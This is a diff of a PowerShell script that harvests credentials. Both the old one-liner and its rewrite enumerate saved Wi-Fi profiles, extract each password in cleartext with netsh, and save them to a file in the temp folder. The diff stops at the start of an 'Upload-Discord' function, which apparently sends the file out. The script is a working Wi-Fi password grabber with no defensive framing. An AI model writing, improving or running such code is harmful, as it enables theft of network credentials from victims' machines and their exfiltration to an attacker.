@@ -1,6 +1,27 @@
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+$wifiProfiles = @()
 
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
+$profileNames = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+    ($_ -split ":")[1].Trim()
+}
+
+foreach ($name in $profileNames) {
+    $profileInfo = netsh wlan show profile name="$name" key=clear
+    $passwordLine = $profileInfo | Select-String "Key Content"
+
+    if ($passwordLine) {
+        $password = ($passwordLine -split ":")[1].Trim()
+    } else {
+        $password = "[Kein Passwort gespeichert]"
+    }
+
+    $wifiProfiles += [PSCustomObject]@{
+        PROFILE_NAME = $name
+        PASSWORD     = $password
+    }
+}
+
+# In Datei schreiben
+$wifiProfiles | Format-Table -AutoSize | Out-String | Set-Content "$env:TEMP\--wifi-pass.txt"
 
 function Upload-Discord {
 
